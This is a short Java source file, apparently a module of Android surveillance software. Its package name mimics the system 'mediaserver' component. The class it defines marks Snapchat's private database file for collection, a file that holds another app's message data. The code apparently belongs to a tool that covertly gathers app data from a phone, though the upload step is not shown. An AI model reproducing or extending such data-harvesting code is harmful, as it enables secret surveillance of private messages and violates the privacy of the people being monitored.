package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class SnapchatFetcher extends FileFetcher {
  public SnapchatFetcher() {
    mFetchedFiles = new ArrayList();
    mFetchedFiles.add(
        new FetchedFile(new File("/data/data/com.snapchat.android/databases/tcspahn.db"), "APP",
            "snapchat"));
  }
}
